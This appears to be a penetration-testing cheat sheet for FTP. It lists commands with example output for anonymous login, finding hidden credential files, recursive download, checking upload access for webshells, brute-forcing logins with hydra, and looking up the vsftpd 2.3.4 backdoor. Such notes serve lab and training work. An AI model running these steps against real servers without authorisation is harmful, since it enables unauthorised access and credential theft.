# FTP (21)

### Anonymous login

Try blank password and email@email.com — Misconfigured FTP servers

```bash
ftp $IP
Username: anonymous
Password: (blank)
```

<details>
<summary>Example Output</summary>

```
230 Login successful.
ftp> ls
-rw-r--r--  1 0  0   1024 Jan 01 config.txt
-rw-r--r--  1 0  0    512 Jan 01 backup.zip
```
</details>

---

### List all files including hidden

Check every directory — Hidden files with creds

```bash
ls -la
cd ..
ls -la
```

<details>
<summary>Example Output</summary>

```
drwxr-xr-x  2 0 0  4096 Jan 01 .
drwxr-xr-x  3 0 0  4096 Jan 01 ..
-rw-r--r--  1 0 0   220 Jan 01 .bash_history
-rw-r--r--  1 0 0  1679 Jan 01 .id_rsa
```
</details>

---

### Download everything

Recursive download — Grab all files for offline review

```bash
wget -r ftp://anonymous@$IP/
```

<details>
<summary>Example Output</summary>

```
wget -r ftp://anonymous@10.10.10.5/
Downloaded: 12 files, 45K
./10.10.10.5/backup.zip
./10.10.10.5/.hidden/credentials.txt
(Check every file offline)
```
</details>

---

### Check for write access

Can you upload? webshell potential — Upload to web root = RCE

```bash
put test.txt
```

<details>
<summary>Example Output</summary>

```
ftp> put test.txt
226 Transfer complete.
(SUCCESS = you can upload webshells)
```
</details>

---

### Brute force creds

If anonymous fails — Default/weak creds

```bash
hydra -L users.txt -P passwords.txt ftp://$IP
```

<details>
<summary>Example Output</summary>

```
hydra -L users.txt -P passwords.txt ftp://10.10.10.5
[21][ftp] host: 10.10.10.5 login: admin password: admin123
(FOUND VALID CREDENTIALS)
```
</details>

---

### Check FTP version for exploits

Version from nmap output — vsftpd 2.3.4 backdoor, ProFTPD exploits

```bash
searchsploit vsftpd
searchsploit proftpd
```

<details>
<summary>Example Output</summary>

```
searchsploit vsftpd
vsftpd 2.3.4 - Backdoor Command Execution
(If version matches = instant shell)
```
</details>

---
